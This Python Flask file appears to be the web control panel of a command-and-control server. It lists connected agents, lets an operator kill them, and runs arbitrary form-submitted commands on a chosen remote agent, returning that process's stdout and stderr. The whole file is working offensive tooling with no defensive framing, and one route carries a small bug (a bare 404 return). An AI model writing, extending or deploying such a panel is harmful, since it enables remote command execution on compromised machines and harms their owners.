from uuid import UUID

from flask import Flask, render_template, redirect, url_for, request, make_response

from c2 import C2

c2 = C2(("127.0.0.1", 1337))
app = Flask(__name__)


@app.route("/")
def home():
    return render_template("home.html", c2=c2)


@app.route("/agent/<uuid>/kill", methods=["POST"])
def kill_agent(uuid):
    uuid = UUID(uuid)
    agent = c2.agents.get(uuid)
    if agent is None:
        return 404
    agent.die()
    return redirect(url_for("home"))


@app.route("/agent/<uuid>/process", methods=["POST"])
def processes(uuid):
    uuid = UUID(uuid)
    agent = c2.agents.get(uuid)
    if agent is None:
        return "Not found", 404
    command = request.form["command"]
    pid = agent.spawn_process(command).pid
    return redirect(url_for("process", uuid=uuid, pid=pid))


@app.route("/agent/<uuid>/process/<int:pid>")
def process(uuid, pid):
    uuid = UUID(uuid)
    agent = c2.agents.get(uuid)
    if agent is None:
        return "Not found", 404
    process = agent.processes.get(pid)
    if process is None:
        return "Not found", 404
    return render_template("process.html", agent=uuid, pid=process.pid)


@app.route("/agent/<uuid>/process/<int:pid>/stdout")
def stdout(uuid, pid):
    uuid = UUID(uuid)
    agent = c2.agents.get(uuid)
    if agent is None:
        return "Not found", 404
    process = agent.processes.get(pid)
    if process is None:
        return "Not found", 404
    return bytes(process.stdout)


@app.route("/agent/<uuid>/process/<int:pid>/stderr")
def stderr(uuid, pid):
    uuid = UUID(uuid)
    agent = c2.agents.get(uuid)
    if agent is None:
        return "Not found", 404
    process = agent.processes.get(pid)
    if process is None:
        return "Not found", 404
    return process.stderr


if __name__ == '__main__':
    with c2:
        app.run()
